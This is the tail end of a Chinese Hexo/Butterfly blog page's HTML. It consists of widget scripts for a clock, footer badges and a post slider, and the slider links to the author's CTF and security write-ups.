id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script data-pjax>function butterfly_clock_anzhiyu_injector_config(){var e=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock_anzhiyu"),e&&e.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",qweather_key="9c502e878eb34e7caeccfb19d203cdf5",gaud_map_key="dab28708d5a2e1a3a213f8ab055e2f03",baidu_ak_key="undefined",flag=0,clock_rectangle="113.34532,23.15624",clock_default_rectangle_enable="false",i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_anzhiyu_injector_config()</script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementsByClassName("footer-beautify")[0];console.log("已挂载butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github、gitee同步托管" title=""><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="https://gitee.com/" style="margin-inline:5px" data-title="本站项目由Github、gitee同步托管" title=""><img src="https://img.shields.io/badge/Source-Gitee-d021d6?style=flat&amp;logo=Gitee" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/" style="margin-inline:5px" data-title="由又拍云提供CDN加速" title=""><img src="https://s1rius.space/img/custom/youpy.png" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/custom/footer.js"></script><script data-pjax>function butterfly_swiper_injector_config(){var i=document.getElementById("recent-posts");console.log("已挂载butterfly_swiper"),i.insertAdjacentHTML("afterbegin",'<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/05/untiAoi/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="https://s1rius.space/img/cover/image-20230128114024.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-05-16</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/05/untiAoi/&quot;);" href="javascript:void(0);" alt="">AoiAWD反制脚本</a><div class="blog-slider__text">AoiAWD脏数据注入脚本</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/05/untiAoi/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2025/02/htb-Cat/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="https://s1rius.space/img/cover/672110e9c9b55.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-02-20</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2025/02/htb-Cat/&quot;);" href="javascript:void(0);" alt="">htb-Cat</a><div class="blog-slider__text">htb-Cat</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2025/02/htb-Cat/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/05/awdwp/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="https://s1rius.space/img/cover/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-05-16</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/05/awdwp/&quot;);" href="javascript:void(0);" alt="">2024 长城杯铁人三项半决赛第二赛区 wp</a><div class="blog-slider__text">2024 长城杯铁人三项半决赛第二赛区 wp (未整理完)</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/05/awdwp/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/12/2022unctf wp/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="https://s1rius.space/img/cover/v2-b44931ea513e5f7b3b06f2703f79653c_1440w.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-12-31</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/12/2022unctf wp/&quot;);" href="javascript:void(0);" alt="">2022 unctf wp</a><div class="blog-slider__text">2022 unctf wp</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/12/2022unctf wp/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>')}for(var elist="undefined".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_swiper_injector_config()</script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script></body></html>